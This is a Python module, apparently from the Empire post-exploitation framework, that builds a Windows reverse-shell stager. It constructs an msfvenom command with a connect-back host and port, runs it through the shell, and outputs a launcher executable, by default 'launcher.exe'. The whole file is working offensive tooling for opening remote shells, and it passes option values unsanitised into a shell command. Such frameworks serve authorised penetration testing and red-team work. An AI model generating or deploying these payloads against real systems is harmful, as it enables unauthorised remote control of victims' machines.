from __future__ import print_function

import socket
import threading
import subprocess

from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Stage 0 - Reverse Shell',

            'Author': ['@Cx01N'],

            'Description': 'Generates a reverse shell using msfvenom to act as a stage 0.',

            'Comments': ['']
        }

        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'LocalHost': {
                'Description': 'Address for the reverse shell to connect back to.',
                'Required': True,
                'Value': '192.168.1.1'
            },
            'LocalPort': {
                'Description': 'Port on local host for the reverse shell.',
                'Required': True,
                'Value': '9999'
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': False,
                'Value': 'launcher.exe'
            },
            'MSF_Format': {
                'Description': 'Format for compiling the msfvenom payload.',
                'Required': True,
                'Value': 'exe',
                'SuggestedValues': ['exe', 'hex', 'dword', 'java', 'python', 'ps1'],
            },
            'Arch': {
                'Description': 'Architecture of the .dll to generate (x64 or x86).',
                'Required': True,
                'Value': 'x64',
                'SuggestedValues': ['x64', 'x86'],
                'Strict': True
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.main_menu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        # extract all of our options
        arch = self.options['Arch']['Value']
        lhost = self.options['LocalHost']['Value']
        lport = self.options['LocalPort']['Value']
        msf_format = self.options['MSF_Format']['Value']

        shell = self.generate_shellcode(lhost, lport, msf_format, arch)

        return shell

    def generate_shellcode(self, lhost, lport, msf_format, arch):
        print("[*] Generating Shellcode %s with lhost %s and lport %s" % (arch, lhost, lport))

        if (arch == "x64"):
            msf_payload = "windows/x64/shell_reverse_tcp"
        else:
            msf_payload = "windows/shell_reverse_tcp"

        # generate the msfvenom command
        msf_command = f'msfvenom -p {msf_payload} LHOST={lhost} LPORT={lport} -f {msf_format}'

        # Run the command and get output
        print(f"[*] MSF command -> {msf_command}")
        return subprocess.check_output(msf_command, shell=True)
